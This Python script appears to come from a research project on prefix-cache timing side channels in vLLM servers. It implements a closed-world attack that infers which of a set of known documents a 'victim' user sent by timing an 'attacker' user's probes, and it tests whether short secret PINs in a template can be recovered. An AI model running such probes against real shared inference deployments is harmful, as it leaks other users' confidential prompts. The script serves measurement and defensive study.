#!/usr/bin/env python
"""Experiment 13 - closed-world prompt recovery via full-prefix timing (a POSITIVE).

The per-block channel is noise (Exp 11), but the FULL-PREFIX channel is strong
(Exp 01: AP 1.00). So match the attack to the signal: when the victim's secret is
one of a KNOWN candidate set, probe each candidate and the cached one hits. This
recovers WHICH candidate the victim used.

Two regimes draw the boundary:
  distinct : M substantially different documents -> strong signal -> high accuracy (POSITIVE)
  field    : one shared template, M short secret values -> only the field differs
             (fine-grained) -> ~chance (the Exp 11 per-block limit, in attack form)
Isolation: fresh chat+cache_salt namespace per trial (no /reset on this build).
"""
from __future__ import annotations
import argparse, random, statistics, sys, time, uuid
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))
from cachelab.config import Config
from cachelab.client import TimingClient
from cachelab.server import wait_until_healthy
from cachelab.io_utils import new_run_dir, save_json

TOPICS = [
    "The quarterly revenue report for the northern manufacturing division shows steady growth across all three production lines, with the automation upgrade now fully operational and ahead of schedule.",
    "Maritime shipping schedules for the eastern trade route have been revised after the new deep-water port opened, reducing average transit times by nearly two days for container traffic.",
    "The clinical trial protocol for the respiratory therapy enrolls participants across twelve regional centers, with the primary endpoints measured at the six-month follow-up visit for each cohort.",
    "Our agricultural cooperative's irrigation plan for the coming season allocates water rights under the updated watershed agreement that every member farm signed during the spring assembly.",
    "The municipal transit authority's expansion proposal adds four light-rail stations to the downtown corridor, funded through a blend of federal grants and locally approved bond measures.",
    "Release notes for the distributed database engine describe a new consensus protocol that raises write throughput under high-contention workloads without weakening the consistency guarantees.",
    "The art restoration committee's assessment of the renaissance fresco recommends a conservative cleaning approach that preserves the original pigments while stabilizing the aging plaster substrate.",
    "Wildlife migration data from the tagged caribou herd reveals a shift in the seasonal route, most likely driven by a change in the timing of the spring thaw spreading across the open tundra.",
]
TEMPLATE = ("Confidential settlement memo. The parties agree to the terms set forth herein. "
            "The designated account PIN for release authorization is {secret}, and all wire "
            "transfers must be confirmed by both signatories before the funds are disbursed.")


def prime(client, cfg, text, salt):
    client.measure(cfg.model.name, text, max_tokens=1, user="victim_user", cache_salt=salt, chat=True)
    time.sleep(cfg.timing.inter_request_delay)


def probe(client, cfg, text, salt):
    m = client.measure(cfg.model.name, text, max_tokens=1, user="attacker_user", cache_salt=salt, chat=True)
    time.sleep(cfg.timing.inter_request_delay)
    return m.client_ttft if m.ok else None


def run_regime(client, cfg, candidates, trials):
    correct = 0
    gaps = []
    for _ in range(trials):
        salt = f"cw-{uuid.uuid4().hex}"
        victim = random.randrange(len(candidates))
        prime(client, cfg, candidates[victim], salt)
        ttfts = []
        for c in candidates:
            t = probe(client, cfg, c, salt)
            ttfts.append(t if t is not None else float("inf"))
        guess = min(range(len(candidates)), key=lambda i: ttfts[i])
        correct += int(guess == victim)
        finite = sorted(t for t in ttfts if t != float("inf"))
        if len(finite) >= 2:
            gaps.append(finite[1] - finite[0])
    return correct / trials, (statistics.median(gaps) if gaps else float("nan"))


def main() -> int:
    a = argparse.ArgumentParser()
    a.add_argument("--config", default="config/replication.yaml")
    a.add_argument("--candidates", type=int, default=8)
    a.add_argument("--trials", type=int, default=20)
    args = a.parse_args()
    cfg = Config.load(args.config)
    print("[*] waiting for vLLM server health...")
    if not wait_until_healthy(cfg):
        print("[!] server not healthy", file=sys.stderr)
        return 1
    client = TimingClient(cfg.server.base_url)
    M = min(args.candidates, len(TOPICS))
    distinct = TOPICS[:M]
    field = [TEMPLATE.format(secret=f"{1000 + i * 137:04d}") for i in range(M)]

    results = {}
    try:
        for name, cands in (("distinct (different documents)", distinct),
                            ("field (shared template, short secret)", field)):
            acc, gap = run_regime(client, cfg, cands, args.trials)
            chance = 1.0 / M
            verdict = "ATTACK SUCCEEDS" if acc > 2 * chance else "no better than chance"
            print(f"\n=== {name} ===")
            print(f"    M={M} candidates, {args.trials} trials")
            print(f"    recovery accuracy : {acc*100:5.1f}%   (chance = {chance*100:.1f}%)")
            print(f"    best-vs-2nd gap   : {gap*1000:5.2f} ms (median)")
            print(f"    --> {verdict}")
            results[name] = {"accuracy": acc, "chance": chance, "gap_ms": round(gap * 1000, 3),
                             "M": M, "trials": args.trials, "succeeds": acc > 2 * chance}
    finally:
        client.close()

    run_dir = new_run_dir("runs")
    save_json({"experiment": "13_closed_world", "model": cfg.model.name, "results": results},
              run_dir / "closed_world.json")
    print(f"\n[*] wrote {run_dir/'closed_world.json'}")
    print("\n    Reading: timing recovers WHICH document the victim used (distinct candidates,")
    print("    strong full-prefix signal) but NOT a short secret inside a shared template")
    print("    (field-level = the per-block limit). Match the attack to the signal.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
